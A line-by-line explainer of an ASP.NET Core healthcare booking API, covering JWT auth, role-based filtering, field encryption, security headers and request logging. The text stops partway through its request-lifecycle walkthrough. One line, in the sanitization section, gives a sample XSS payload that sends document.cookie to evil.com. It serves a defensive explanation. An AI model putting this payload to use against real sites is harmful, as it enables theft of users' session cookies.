# Sanad Platform API — Full Pipeline Explained (Line by Line)

This document takes every single piece of the pipeline walkthrough and explains **what it does, why it's there, and how it connects** to the rest of the system.

---

## Table of Contents

1. [Architecture Overview](#1-architecture-overview)
2. [Program.cs — The Entry Point](#2-programcs--the-entry-point)
3. [Entity — Booking.cs](#3-entity--bookingcs)
4. [DTOs — Data Transfer Objects](#4-dtos--data-transfer-objects)
5. [API Response Wrapper](#5-api-response-wrapper)
6. [Specification Pattern](#6-specification-pattern)
7. [Repository Layer](#7-repository-layer)
8. [Service Layer](#8-service-layer)
9. [Controller Layer](#9-controller-layer)
10. [Data-in-Transit Security Middleware](#10-data-in-transit-security-middleware)
11. [Request Logging Middleware](#11-request-logging-middleware)
12. [Security Services](#12-security-services)
13. [DbContext with Encryption at Rest](#13-dbcontext-with-encryption-at-rest)
14. [API Versioning](#14-api-versioning)
15. [Configuration — appsettings.json](#15-configuration--appsettingsjson)
16. [Frontend Client](#16-frontend-client)
17. [Full Request Lifecycle](#17-full-request-lifecycle)

---

## 1. Architecture Overview

The Sanad Platform uses **Vertical Slice Architecture**. Instead of organizing code into horizontal layers (all controllers in one folder, all services in another), each **feature** contains its own complete stack:

```
Features/Bookings/
├── Controllers/       ← HTTP endpoint
├── DTOs/              ← Request/Response shapes
├── Entities/          ← Database model
├── Services/          ← Business logic
├── Repository/        ← Data access
└── Validators/        ← Input validation
```

**Why this matters:**
- Each feature is self-contained — you can find everything related to "Bookings" in one folder
- Teams can work on different features in parallel without merge conflicts
- You can delete an entire feature without affecting others
- Testing is easier because each slice is independent

The request flows through these layers in order:

```
Client → HTTPS/TLS → Security Headers → Logging → JWT Auth → Versioning
→ Controller → Service → Repository → EF Core → Database
→ (response flows back through the same layers in reverse)
```

---

## 2. Program.cs — The Entry Point

`Program.cs` is where the entire application is configured. It runs **once** at startup and sets up every service, middleware, and configuration the app needs.

### 2.1 Serilog (Structured Logging)

```csharp
Log.Logger = new LoggerConfiguration()
    .MinimumLevel.Override("Microsoft", LogEventLevel.Information)
    .Enrich.FromLogContext()
    .Enrich.WithEnvironmentUserName()
    .Enrich.WithThreadId()
    .Enrich.WithProperty("Application", "SanadPlatform.API")
    .WriteTo.Console()
    .WriteTo.MSSqlServer(...)
    .CreateLogger();
```

**What each line does:**

| Line | Purpose |
|------|---------|
| `MinimumLevel.Override("Microsoft", ...)` | Microsoft's own framework generates thousands of log messages. This filters them to only show `Information` level and above, reducing noise. |
| `Enrich.FromLogContext()` | Allows adding contextual properties (like Correlation IDs) to logs dynamically at runtime. Without this, `LogContext.PushProperty()` wouldn't work. |
| `Enrich.WithEnvironmentUserName()` | Adds the OS username running the app to every log entry. Useful when multiple people deploy to staging. |
| `Enrich.WithThreadId()` | Records which thread processed the request. Critical for debugging concurrency issues. |
| `Enrich.WithProperty("Application", ...)` | Tags every log with the app name. If multiple microservices log to the same database, you can filter by application. |
| `WriteTo.Console()` | Outputs logs to the terminal during development so you can see them in real time. |
| `WriteTo.MSSqlServer(...)` | Persists logs to a dedicated SQL Server database (`SanadPlatformLogsDb`). The `AutoCreateSqlTable = true` option means the `RequestLogs` table is created automatically on first run. |

**Why a separate logging database?** If the main database goes down, you still want logs to work. It also prevents heavy log queries from slowing down production queries.

### 2.2 Entity Framework Core (Database)

```csharp
builder.Services.AddDbContext<SanadDbContext>(options =>
    options.UseSqlServer(connectionString,
        sql => sql.EnableRetryOnFailure(3, TimeSpan.FromSeconds(10), null)));
```

- `AddDbContext<SanadDbContext>` registers the database context for dependency injection. Every class that needs the DB gets it injected automatically.
- `UseSqlServer(...)` tells EF Core to use SQL Server as the database engine.
- `EnableRetryOnFailure(3, ...)` means if the database connection drops (transient failure), EF Core will automatically retry up to 3 times with a 10-second delay between attempts. This prevents intermittent network blips from crashing the API.

### 2.3 Security Services Registration

```csharp
builder.Services.AddScoped<IPasswordHashingService, PasswordHashingService>();
builder.Services.AddScoped<IEncryptionService, EncryptionService>();
builder.Services.AddScoped<IEncryptedFieldService, EncryptedFieldService>();
builder.Services.AddScoped<IDataSanitizationService, DataSanitizationService>();
builder.Services.AddScoped<IClaimsService, ClaimsService>();
```

**`AddScoped` means:** A new instance is created per HTTP request and shared across that request. For example, if both the controller and service need `IEncryptionService`, they get the **same instance** within one request, but a **different instance** for the next request. This is important for:
- Memory efficiency (not creating new objects for every injection)
- Consistency (same encryption key used throughout one request)

**Why interfaces (`I...`)?** The controller depends on `IAppointmentService` (interface), not `AppointmentService` (class). This means:
- You can swap implementations without changing any calling code
- You can create mock implementations for unit testing
- It enforces the Dependency Inversion Principle (D in SOLID)

### 2.4 JWT Authentication

```csharp
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options => {
        options.TokenValidationParameters = new TokenValidationParameters {
            ValidateIssuerSigningKey = true,
            IssuerSigningKey = new SymmetricSecurityKey(
                Encoding.UTF8.GetBytes(config["Jwt:Key"]!)),
            ValidateIssuer   = true,
            ValidIssuer      = config["Jwt:Issuer"],
            ValidateAudience = true,
            ValidAudience    = config["Jwt:Audience"],
            ValidateLifetime = true,
            ClockSkew        = TimeSpan.Zero
        };
    });
```

**What each validation does:**

| Parameter | What it checks | Why it matters |
|-----------|---------------|----------------|
| `ValidateIssuerSigningKey` | Verifies the token's signature matches the secret key | Prevents forged tokens — without this, anyone could create fake JWTs |
| `IssuerSigningKey` | The actual secret key used to verify the signature | Must match the key used to generate the token at login |
| `ValidateIssuer` | Checks the `iss` claim in the token | Ensures the token was issued by YOUR server, not someone else's |
| `ValidateAudience` | Checks the `aud` claim in the token | Ensures the token was meant for THIS application |
| `ValidateLifetime` | Checks if the token has expired | Prevents reuse of old tokens |
| `ClockSkew = TimeSpan.Zero` | No tolerance for expired tokens | Default is 5 minutes of slack. Setting to zero means tokens expire exactly when they should. |

### 2.5 API Versioning

```csharp
builder.Services.AddApiVersioningConfig();
```

This single line calls the extension method that configures URL-based API versioning. It means endpoints become `/api/v1/appointments` and `/api/v2/appointments`. Explained in detail in [Section 14](#14-api-versioning).

### 2.6 Feature Services (Vertical Slice)

```csharp
builder.Services.AddScoped<IAppointmentRepository, AppointmentRepository>();
builder.Services.AddScoped<IAppointmentService, AppointmentService>();
```

These register the Bookings feature's own repository and service. Each feature does this for its own classes. This is the "Dependency Injection" pattern — instead of `new AppointmentService()`, the framework creates and manages instances for you.

### 2.7 MediatR, FluentValidation, AutoMapper

```csharp
builder.Services.AddMediatR(cfg =>
    cfg.RegisterServicesFromAssembly(typeof(Program).Assembly));
builder.Services.AddValidatorsFromAssembly(typeof(Program).Assembly);
builder.Services.AddAutoMapper(typeof(Program).Assembly);
```

| Library | Purpose |
|---------|---------|
| **MediatR** | Implements the CQRS pattern. Commands (write operations) and Queries (read operations) are sent through a mediator that routes them to the correct handler. Also enables **pipeline behaviors** (cross-cutting concerns like validation and logging that run automatically on every request). |
| **FluentValidation** | Validates incoming requests with strongly-typed rules. Instead of `if (request.PageSize < 1) return BadRequest()` scattered everywhere, you write a single validator class. The `ValidationBehavior` pipeline behavior runs these automatically before the handler executes. |
| **AutoMapper** | Automatically maps Entity objects to DTO objects. Instead of writing `new AppointmentResponse { Id = booking.Id, ... }` for every field, AutoMapper does `_mapper.Map<AppointmentResponse>(booking)` and copies matching properties by name. |

### 2.8 CORS Configuration

```csharp
builder.Services.AddCors(o => o.AddPolicy("AllowFrontend", p =>
    p.WithOrigins(allowedOrigins)
     .AllowAnyMethod().AllowAnyHeader().AllowCredentials()));
```

**CORS (Cross-Origin Resource Sharing)** is a browser security feature. By default, a React app at `http://localhost:3000` cannot call an API at `https://api.sanad.com` — the browser blocks it. This configuration:

- `WithOrigins(allowedOrigins)` — Only allows requests from specific frontend URLs (no wildcard `*`)
- `AllowAnyMethod()` — Allows GET, POST, PUT, DELETE, etc.
- `AllowAnyHeader()` — Allows custom headers like `Authorization` and `X-Correlation-Id`
- `AllowCredentials()` — Allows cookies and auth headers to be sent

### 2.9 Middleware Pipeline Order

```csharp
app.UseCookiePolicy();
app.UseDataInTransitSecurity(...);
app.UseMiddleware<RequestLoggingMiddleware>();
app.UseHttpsRedirection();
app.UseCors("AllowFrontend");
app.UseAuthentication();
app.UseAuthorization();
app.MapControllers();
```

**Order matters enormously.** Each middleware wraps the next one like Russian dolls. A request passes through them top-to-bottom, and the response passes back bottom-to-top:

```
Request  →  CookiePolicy → Security → Logging → HTTPS → CORS → Auth → Controller
Response ←  CookiePolicy ← Security ← Logging ← HTTPS ← CORS ← Auth ← Controller
```

- Security headers are added FIRST (they must be on every response, even errors)
- Logging wraps everything else so it can measure total execution time
- Authentication runs BEFORE authorization (you must know WHO someone is before checking WHAT they can do)
- Controllers are last — they only handle requests that passed all middleware checks

---

## 3. Entity — Booking.cs

An entity is the C# representation of a database table row. Each property maps to a column.

### Key Fields Explained

```csharp
[Key]
public Guid Id { get; set; } = Guid.NewGuid();
```

`[Key]` marks this as the primary key. `Guid.NewGuid()` generates a globally unique identifier automatically. GUIDs are preferred over auto-incrementing integers because:
- They're unique across all databases (important for distributed systems)
- They can be generated client-side without hitting the database
- They don't reveal how many records exist (security)

### Encryption Attributes

```csharp
[SearchableEncrypted(Classification = DataClassification.Critical)]
public string BookingNumber { get; set; }
```

- `[SearchableEncrypted]` uses **deterministic encryption**: the same input always produces the same ciphertext. This means you CAN search for it with `WHERE BookingNumber = 'encrypted_value'` because equality comparisons work. However, it's slightly less secure because patterns in data could theoretically be detected.

```csharp
[Encrypted(Classification = DataClassification.Confidential)]
public string PatientName { get; set; }
```

- `[Encrypted]` uses **randomized encryption** (AES-256-GCM): the same input produces different ciphertext each time (due to random IV/nonce). You CANNOT search on it, but it's the most secure option. Used for data you read but don't query by.

`DataClassification` levels control key rotation priority:
- `Critical` = rotate monthly (SSN, payment info)
- `Confidential` = rotate quarterly (names, medical data)
- `Sensitive` = rotate annually

### Navigation Properties

```csharp
public virtual Patient?  Patient  { get; set; }
public virtual Provider? Provider { get; set; }
```

These are EF Core **navigation properties**. They represent relationships between tables. When you do `.Include(b => b.Patient)`, EF Core does a SQL JOIN and populates this property. `virtual` allows lazy loading (though we use eager loading via `.Include()` for better performance).

### Status as String (not Enum)

```csharp
public string Status { get; set; } = "Scheduled";
```

Status is stored as a string rather than an enum for flexibility — new statuses can be added without database migrations. The valid transition is: `Scheduled → Confirmed → Completed` or `Scheduled → Cancelled`.

---

## 4. DTOs — Data Transfer Objects

DTOs are objects that carry data between the client and server. They are **separate from entities** on purpose:

**Why not return the entity directly?**
1. **Security**: The entity might have fields you don't want to expose (encrypted GUIDs, internal IDs)
2. **Shape**: The API response shape might be different from the database shape
3. **Stability**: You can change the database without breaking the API contract
4. **Performance**: DTOs contain only the fields the client actually needs

### GetAppointmentsRequest

```csharp
[Range(1, 100)]
public int PageSize { get; set; } = 20;
```

`[Range(1, 100)]` is a **data annotation** that tells ASP.NET Core's model validation: "This value must be between 1 and 100". If the client sends `pageSize=5000`, the framework automatically returns `400 Bad Request` with a validation error. This prevents a client from requesting millions of rows and crashing the server.

```csharp
public Guid? PatientId { get; set; }  // Admin only
```

The `?` makes it nullable. This is admin-only: patients and providers have their ID enforced by the service layer (they can't look up other people's appointments). The `// Admin only` comment means the service layer ignores this parameter for non-admin roles.

### PaginatedAppointmentsResponse

```csharp
public int  TotalPages      => (int)Math.Ceiling(TotalCount / (double)PageSize);
public bool HasNextPage     => PageNumber < TotalPages;
public bool HasPreviousPage => PageNumber > 1;
```

These are **computed properties** (using `=>`). They're calculated from other fields, not stored. The client uses `HasNextPage` to know whether to show a "Next" button, and `TotalPages` to show "Page 3 of 12". `Math.Ceiling` rounds up so 101 items with PageSize=20 gives 6 pages (not 5).

---

## 5. API Response Wrapper

```csharp
public class ApiResponse<T>
{
    public bool   Success { get; set; }
    public string Message { get; set; }
    public T?     Data    { get; set; }
    public Dictionary<string, string[]>? Errors { get; set; }
}
```

Every API response is wrapped in this generic class. This gives the client a **consistent structure** to parse:

**Success response:**
```json
{
  "success": true,
  "message": "Appointments retrieved successfully",
  "data": { "items": [...], "totalCount": 42, ... },
  "errors": null
}
```

**Error response:**
```json
{
  "success": false,
  "message": "Validation failed",
  "data": null,
  "errors": {
    "PageSize": ["Must be between 1 and 100"],
    "Email": ["Invalid email format"]
  }
}
```

The `<T>` generic parameter means `Data` can be any type — a list of appointments, a single patient, a login token, etc. The factory methods `SuccessResponse()` and `ErrorResponse()` are shortcuts so controllers don't need to set every property manually.

---

## 6. Specification Pattern

The Specification Pattern **encapsulates query logic** into a reusable object instead of scattering it across the repository.

### Base Specification

```csharp
public abstract class AppointmentSpecification
{
    public Expression<Func<Booking, bool>>? Criteria { get; protected set; }
    public List<Expression<Func<Booking, object>>> Includes { get; } = new();
    public Expression<Func<Booking, object>>? OrderBy { get; protected set; }
    public int Skip { get; protected set; }
    public int Take { get; protected set; }
    public bool IsPagingEnabled { get; protected set; }
}
```

| Property | SQL Equivalent | Purpose |
|----------|---------------|---------|
| `Criteria` | `WHERE ...` | Filter which rows to return |
| `Includes` | `JOIN ...` | Which related tables to include (eager loading) |
| `OrderBy` | `ORDER BY ...` | How to sort results |
| `Skip` | `OFFSET ...` | How many rows to skip (pagination) |
| `Take` | `FETCH NEXT ...` | How many rows to return (page size) |

`Expression<Func<Booking, bool>>` is an **expression tree** — it's not compiled C# code, it's a data structure that EF Core translates into SQL. This is crucial: if you used `Func<Booking, bool>` instead, EF Core would load ALL rows into memory and filter in C#, which would be extremely slow.

### Concrete Specification — Building the Query

```csharp
Expression<Func<Booking, bool>> predicate = b => true;

if (patientId.HasValue)
    predicate = predicate.And(b => b.PatientId == patientId.Value);
```

Starts with `b => true` (match everything) and progressively narrows it down. The `.And()` extension method combines predicates using `AND` logic. If `patientId` is provided, it adds `AND PatientId = @patientId` to the WHERE clause.

### Sorting

```csharp
Expression<Func<Booking, object>> sortExpr = sortBy.ToLower() switch
{
    "bookingdate" => b => b.BookingDate,
    "status"      => b => b.Status,
    "patientname" => b => b.PatientName,
    _             => b => b.BookingDate  // default fallback
};
```

This is a **switch expression** (C# 8+). It maps the client's sort field name (a string) to an actual property selector. The `_` is the default case — if the client sends an unknown field name, it falls back to sorting by `BookingDate`. This prevents SQL injection because the client never writes raw SQL — they just pick from a whitelist of field names.

### Pagination Math

```csharp
Skip = (page - 1) * pageSize;
Take = pageSize;
```

If the client requests page 3 with 20 items per page: `Skip = (3-1) * 20 = 40`, `Take = 20`. This means "skip the first 40 rows, return the next 20" — giving you rows 41–60.

---

## 7. Repository Layer

The repository is the **only layer that touches the database**. No other layer writes LINQ queries or uses `DbContext` directly.

### Key Techniques

```csharp
IQueryable<Booking> query = _context.Bookings.AsNoTracking();
```

`AsNoTracking()` tells EF Core: "I'm only reading data, don't track changes." By default, EF Core watches every entity for modifications (change tracking). For read-only operations, this is pure overhead. `AsNoTracking()` can make queries **2–3x faster** and use significantly less memory.

```csharp
var totalCount = await query.CountAsync(ct);
```

The total count is obtained BEFORE applying pagination. This tells the client "there are 150 total results" even though you're only returning 20 per page. Without this, the client wouldn't know how many pages exist.

```csharp
foreach (var include in spec.Includes)
    query = query.Include(include);
```

This applies eager loading. In SQL terms, it adds `LEFT JOIN` clauses. Without `.Include()`, the navigation properties (`Patient`, `Provider`, `Service`) would be `null`, and you'd need separate queries to fetch them — the dreaded **N+1 problem** (1 query for bookings + N queries for each booking's patient = terrible performance).

```csharp
var items = await query.ToListAsync(ct);
```

`ToListAsync(ct)` is where the actual SQL query is executed. Everything before this line is just building the query tree. The `ct` parameter is a `CancellationToken` — if the client disconnects (closes browser), the token is cancelled and the database query is aborted, freeing up resources.

---

## 8. Service Layer

The service layer contains **business logic and authorization**. It sits between the controller (HTTP concerns) and the repository (data access).

### Role-Based Access Control (RBAC)

```csharp
private static (Guid? patientId, Guid? providerId) ApplySecurityFilters(
    GetAppointmentsRequest request, Guid userId, string role)
{
    return role.ToLower() switch
    {
        "patient"  => (userId, null),
        "provider" => (null, userId),
        "admin"    => (request.PatientId, request.ProviderId),
        _ => throw new UnauthorizedAccessException($"Unknown role: {role}")
    };
}
```

**This is the most critical security function in the entire pipeline.** It enforces data isolation:

| Role | What Happens | Why |
|------|-------------|-----|
| **Patient** | Forces `patientId = userId` | A patient can ONLY see their own appointments. Even if they send `?patientId=someone-else`, it's overridden with their own ID |
| **Provider** | Forces `providerId = userId` | A doctor can ONLY see appointments assigned to them |
| **Admin** | Uses request parameters as-is | Admins can filter by any patient or provider |
| **Unknown** | Throws exception → 403 Forbidden | Rejects any unrecognized role |

**Why is this in the service (not the controller)?** Because security filtering is **business logic**, not HTTP logic. If you later add a background job that also needs appointments, it goes through the same service with the same security rules.

### The Flow

```csharp
var spec = new GetAppointmentsSpecification(patientId, providerId, ...);
var (items, totalCount) = await _repository.GetAppointmentsAsync(spec, ct);
var dtos = _mapper.Map<List<AppointmentResponse>>(items);
```

1. Apply security filters → get the correct patientId/providerId
2. Build a specification with all filters, sorting, pagination
3. Pass specification to repository → get entities + total count
4. Map entities to DTOs using AutoMapper (entities have encrypted fields, DTOs have clean data)

---

## 9. Controller Layer

The controller is the **HTTP boundary**. It's responsible for:
- Receiving the HTTP request
- Extracting user context from JWT claims
- Validating input
- Calling the service
- Formatting the HTTP response
- Handling errors with appropriate status codes

### Route and Versioning

```csharp
[Route("api/v{version:apiVersion}/[controller]")]
[ApiVersion("1.0")]
[ApiVersion("2.0")]
```

- `v{version:apiVersion}` is a route parameter constrained by the versioning framework. It extracts `1` from `/api/v1/appointments`.
- `[ApiVersion("1.0")]` and `[ApiVersion("2.0")]` mean this controller responds to both v1 and v2 requests. If you wanted different behavior per version, you'd check `ApiVersion version` in the method parameters.
- `[controller]` is replaced with the controller name minus "Controller" — so `AppointmentsController` becomes `appointments`.

### JWT Claims Extraction

```csharp
var userIdClaim = User.FindFirstValue(ClaimTypes.NameIdentifier);
var roleClaim   = User.FindFirstValue(ClaimTypes.Role);
```

`User` is a `ClaimsPrincipal` populated by the JWT middleware. After the token is validated, its claims are available here. `ClaimTypes.NameIdentifier` is the standard claim type for user ID, and `ClaimTypes.Role` for the role. These were put into the token during login by the `ClaimsService`.

### Error Handling Strategy

```csharp
catch (UnauthorizedAccessException ex)
{
    _logger.LogWarning(ex, "Unauthorized access attempt");
    return StatusCode(403, ...);
}
catch (Exception ex)
{
    _logger.LogError(ex, "Error retrieving appointments");
    return StatusCode(500, ApiResponse<object>.ErrorResponse(
        "An unexpected error occurred"));  // generic message
}
```

| Exception | Status Code | Why |
|-----------|-------------|-----|
| `UnauthorizedAccessException` | 403 Forbidden | Thrown by `ApplySecurityFilters` for unknown roles |
| `ArgumentException` | 400 Bad Request | Invalid input values |
| Generic `Exception` | 500 Internal Server Error | Catches everything else. The error is logged in detail but the **client only gets a generic message** — never expose stack traces or internal details to the public. |

---

## 10. Data-in-Transit Security Middleware

This middleware adds **security headers** to every HTTP response. These are instructions to the browser about how to handle the content securely.

### Header Explanations

| Header | Value | What it Prevents |
|--------|-------|-----------------|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` | Forces HTTPS for 1 year. Once a browser sees this, it will NEVER use HTTP for this domain again, even if the user types `http://`. This prevents SSL stripping attacks. |
| `X-Content-Type-Options` | `nosniff` | Prevents the browser from guessing file types. Without this, a browser might execute a disguised JavaScript file that was uploaded as an image. |
| `X-Frame-Options` | `DENY` | Prevents your site from being embedded in an `<iframe>`. This blocks **clickjacking attacks** where an attacker overlays an invisible iframe on a fake page. |
| `Content-Security-Policy` | `default-src 'self'` | Only allows loading resources (scripts, images, styles) from your own domain. Prevents **XSS attacks** by blocking injected external scripts. |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Limits what URL information is sent when navigating away from your site. Prevents leaking sensitive URLs (like `/patients/12345`) to external sites. |
| `Permissions-Policy` | `geolocation=(), microphone=(), camera=()` | Disables browser features you don't need. Even if an attacker injects JavaScript, it can't access the microphone or camera. |
| `Cache-Control` | `no-store, no-cache, must-revalidate` | Prevents browsers and proxies from caching responses. Critical for healthcare data — you don't want patient records saved in browser cache on shared computers. |

### Server Fingerprinting

```csharp
h.Remove("Server");
h.Remove("X-Powered-By");
```

By default, ASP.NET Core adds headers like `Server: Kestrel` and `X-Powered-By: ASP.NET`. These tell attackers exactly what software you're running, making it easier to find known vulnerabilities. Removing them is a simple security hardening measure.

---

## 11. Request Logging Middleware

This middleware captures a complete audit trail of every HTTP request and response.

### Non-Blocking Architecture

```csharp
_ = Task.Run(() => LogRequestResponse(...));
await responseBody.CopyToAsync(originalBodyStream);
```

The `_ = Task.Run(...)` fires and forgets the logging task on a thread pool thread. The response is sent to the client **immediately** — it doesn't wait for the log to be written to the database. This means logging adds **zero latency** to API responses. The `_ =` syntax means "I know this returns a Task, I'm intentionally not awaiting it."

### Correlation IDs

```csharp
if (context.Request.Headers.TryGetValue("X-Correlation-Id", out var id))
    return id.ToString();
var newId = Guid.NewGuid().ToString();
context.Response.Headers["X-Correlation-Id"] = newId;
```

A Correlation ID is a unique identifier that follows a request **through the entire system**. If the client sends one (e.g., from a React frontend), the middleware uses it. If not, it generates a new one. This ID is:
- Added to every log entry via `LogContext.PushProperty`
- Returned to the client in the response header
- Used to trace a single user action across API calls, database queries, and background jobs

**Example:** If a user reports "my appointment didn't save," you can ask for their Correlation ID and query: `SELECT * FROM RequestLogs WHERE LogEvent LIKE '%correlation-id-here%'` to see exactly what happened.

### Request Body Buffering

```csharp
context.Request.EnableBuffering();
```

In ASP.NET Core, the request body is a **forward-only stream** — once read, it's gone. But both the logging middleware and the downstream controller need to read it. `EnableBuffering()` backs the stream with a seekable buffer, so it can be read multiple times. After reading, `request.Body.Position = 0` resets the stream for the next reader.

### Body Truncation

```csharp
return body.Length > 1000 ? body[..1000] + "..." : body;
```

Large request/response bodies (file uploads, big JSON payloads) could bloat the logging database. Truncating to 1000 characters captures enough context for debugging while keeping storage manageable. The `[..1000]` syntax is a C# range operator meaning "first 1000 characters."

### Adaptive Log Levels

```csharp
var level = context.Response.StatusCode >= 500 ? LogEventLevel.Error
          : context.Response.StatusCode >= 400 ? LogEventLevel.Warning
          : LogEventLevel.Information;
```

- **5xx** = `Error` (server crash, database down) — triggers alerts
- **4xx** = `Warning` (bad input, unauthorized) — monitor for patterns (brute force?)
- **2xx/3xx** = `Information` (normal operation) — analytics and audit trail

---

## 12. Security Services

### PasswordHashingService (BCrypt)

```csharp
public string HashPassword(string password)
    => BCrypt.Net.BCrypt.HashPassword(password, workFactor: 12);
```

**BCrypt** is a password hashing algorithm designed to be slow on purpose. The `workFactor: 12` means it runs 2^12 = 4,096 iterations. This makes brute-force attacks impractical — cracking one password takes ~250ms, so trying 1 billion passwords would take ~8 years.

Key properties:
- **Salt**: BCrypt automatically generates a random salt per password. Two users with the same password get different hashes.
- **Constant-time comparison**: `BCrypt.Verify()` takes the same amount of time whether the password is correct or not. This prevents **timing attacks** where an attacker measures response time to guess characters.

### EncryptionService (AES-256-GCM)

```csharp
var nonce = new byte[12]; // 96-bit IV
RandomNumberGenerator.Fill(nonce);
```

A **nonce** (Number used ONCE) is a random value that ensures encrypting the same data twice produces different ciphertext. Without this, an attacker who sees two identical encrypted values knows the plaintext is the same.

```csharp
using var aes = new AesGcm(_key, 16);
aes.Encrypt(nonce, plaintextBytes, ciphertext, tag);
```

**AES-256-GCM** stands for:
- **AES** = Advanced Encryption Standard (the algorithm)
- **256** = 256-bit key (2^256 possible keys — effectively unbreakable)
- **GCM** = Galois/Counter Mode (an **authenticated encryption** mode)

GCM produces both ciphertext AND a **tag** (128-bit authentication tag). When decrypting, the tag is verified first. If even one bit was tampered with, decryption fails. This prevents **data tampering** — an attacker can't modify the ciphertext without being detected.

The output format is: `[12 bytes nonce] + [N bytes ciphertext] + [16 bytes tag]`, all Base64-encoded for storage as a string.

### DataSanitizationService

```csharp
public string SanitizeInput(string input)
    => Regex.Replace(input, @"<script[^>]*>.*?</script>", "", ...);
```

This removes `<script>` tags from user input, preventing **Cross-Site Scripting (XSS)** attacks. Without this, an attacker could type `<script>fetch('evil.com?cookie='+document.cookie)</script>` as their name, and anyone viewing their profile would have their cookies stolen.

### ClaimsService

Claims are key-value pairs embedded in the JWT token. They represent facts about the user:

```csharp
new(ClaimTypes.NameIdentifier, userId),  // Who they are
new(ClaimTypes.Email, email),             // Their email
new(ClaimTypes.Role, role),               // What they can do
new("permissions", permissionsJson)       // Fine-grained access
```

The `HasPermission` method checks if a specific permission (like `"booking:create"`) exists in the token's permissions claim. The `HasRole` method checks role-level access (like `"Admin"`). These are used throughout the application to enforce authorization.

---

## 13. DbContext with Encryption at Rest

```csharp
_encryptedFieldService.ConfigureEncryptedFields(modelBuilder, typeof(Booking));
```

This scans the `Booking` class for any property marked with `[Encrypted]` or `[SearchableEncrypted]` and registers an EF Core **Value Converter** for each one.

**Value Converters** intercept every read and write:
- **On Save**: `"John Doe"` → `EncryptionService.Encrypt()` → `"ABxCD123ef..."` → stored in DB
- **On Load**: `"ABxCD123ef..."` → `EncryptionService.Decrypt()` → `"John Doe"` → returned to code

The beauty is that **business logic never sees encrypted data**. The service layer works with `patient.FullName = "John Doe"` as if there's no encryption. It's completely transparent.

```csharp
var errors = _encryptedFieldService
    .ValidateEncryptedFieldConfiguration(typeof(Booking));
if (errors.Any())
    throw new InvalidOperationException(...);
```

This validation runs at startup and catches configuration errors early (like forgetting to set an encryption key) rather than failing at runtime when a user makes a request.

---

## 14. API Versioning

```csharp
options.DefaultApiVersion = new ApiVersion(1, 0);
options.AssumeDefaultVersionWhenUnspecified = true;
options.ApiVersionReader = new UrlSegmentApiVersionReader();
```

| Setting | What it does |
|---------|-------------|
| `DefaultApiVersion = 1.0` | If no version is specified, assume v1.0 |
| `AssumeDefaultVersionWhenUnspecified` | Don't reject requests without a version number |
| `UrlSegmentApiVersionReader` | Read the version from the URL path (`/api/v1/...`) rather than query strings or headers |

**Why URL versioning?** It's the most visible and cacheable approach. Google, Azure, and AWS all use it. Clients immediately see which version they're using in the URL.

**Response headers:**
```
api-supported-versions: 1.0, 2.0
api-deprecated-versions: (none)
```

Clients can check these headers to know which versions are available and plan their migration.

---

## 15. Configuration — appsettings.json

```json
{
  "ConnectionStrings": {
    "DefaultConnection": "Server=.;Database=SanadPlatformDb;...",
    "LoggingDatabase":   "Server=.;Database=SanadPlatformLogsDb;..."
  }
}
```

**Two separate databases:**
- `DefaultConnection` = main application data (patients, appointments, etc.)
- `LoggingDatabase` = request logs only

Separating them means: log queries don't slow down production, different backup schedules, different access controls, and the logging DB can be on cheaper storage.

```json
"Jwt": {
    "Key": "YourSuperSecretKey_AtLeast32CharactersLong!"
}
```

> **⚠️ In production, this key MUST be stored in Azure Key Vault or environment variables, NEVER in a config file committed to source control.**

The key must be at least 32 characters (256 bits) for HS256 signing.

---

## 16. Frontend Client

### Correlation ID

```typescript
const correlationId = crypto.randomUUID();
sessionStorage.setItem("correlationId", correlationId);
```

The frontend generates a UUID and sends it with every request as `X-Correlation-Id`. If something goes wrong, the user can provide this ID to support, who can then trace the request through the entire backend pipeline.

### JWT Token

```typescript
headers: {
    Authorization: `Bearer ${token}`,
}
```

The `Bearer` scheme is the standard way to send JWT tokens. The token is stored in `localStorage` after login. Every subsequent request includes it. The backend validates it on every request — there's no session state on the server.

### Query String Building

```typescript
const query = new URLSearchParams(
    Object.fromEntries(
        Object.entries(params).filter(([, v]) => v !== undefined)
    )
).toString();
```

This takes the params object, removes any `undefined` values (so optional filters don't appear as `?status=undefined`), and converts it to a URL query string like `?page=1&pageSize=20&status=Scheduled`.

---

## 17. Full Request Lifecycle

Here's exactly what happens when a Patient user clicks "My Appointments" in the React frontend:

### Step 1: Client → Network
The React app calls `GET https://api.sanad.com/api/v1/appointments?page=1&pageSize=20` with the JWT token and a Correlation ID.

### Step 2: TLS Encryption
The request is encrypted using **TLS 1.2+** with AES-256 cipher suites. Even on public WiFi, no one can read the contents. The server's certificate is validated to prevent man-in-the-middle attacks.

### Step 3: Security Headers Middleware
Before any response is sent back, this middleware schedules 7 security headers to be added. It also removes `Server` and `X-Powered-By` headers.

### Step 4: Request Logging Middleware
- Extracts or generates a Correlation ID
- Enables request body buffering (for later reading)
- Starts a high-precision timer (`Stopwatch`)
- Swaps the response body stream with a `MemoryStream` (so it can be read for logging)
- Calls `await _next(context)` to pass control to the next middleware

### Step 5: HTTPS Redirection
If the request came over HTTP, it's 301 redirected to HTTPS. This should never happen in production because HSTS forces HTTPS at the browser level.

### Step 6: CORS
The browser sent an `Origin: http://localhost:3000` header. The middleware checks this against the whitelist. If it matches, it adds `Access-Control-Allow-Origin` headers so the browser allows the response.

### Step 7: JWT Authentication
The `Authorization: Bearer eyJhbG...` header is parsed. The token's signature is verified against the secret key. The expiration is checked. If valid, the claims (userId, email, role) are extracted into `HttpContext.User`.

### Step 8: Authorization
The `[Authorize]` attribute on the controller is checked. Since the token is valid, the request proceeds. If the token was missing or invalid, a `401 Unauthorized` response would be returned here.

### Step 9: API Version Routing
The `v1` from the URL is extracted by `UrlSegmentApiVersionReader`. The routing system finds `AppointmentsController` because it has `[ApiVersion("1.0")]` and the route matches.

### Step 10: Controller
The `GetAppointments` method runs:
1. Extracts `userId` and `role` from JWT claims
2. Validates the `GetAppointmentsRequest` model (page range, page size range, etc.)
3. Calls `_service.GetAppointmentsAsync(request, userId, "patient", ct)`

### Step 11: Service — Security Filtering
`ApplySecurityFilters` sees `role = "patient"`, so it returns `(userId, null)`. This means the SQL query will have `WHERE PatientId = @userId` — the patient can **only see their own appointments**, regardless of what query parameters they sent.

### Step 12: Specification Building
The `GetAppointmentsSpecification` assembles the query:
- WHERE: `PatientId = 'abc-123' AND BookingDate >= '2026-01-01'`
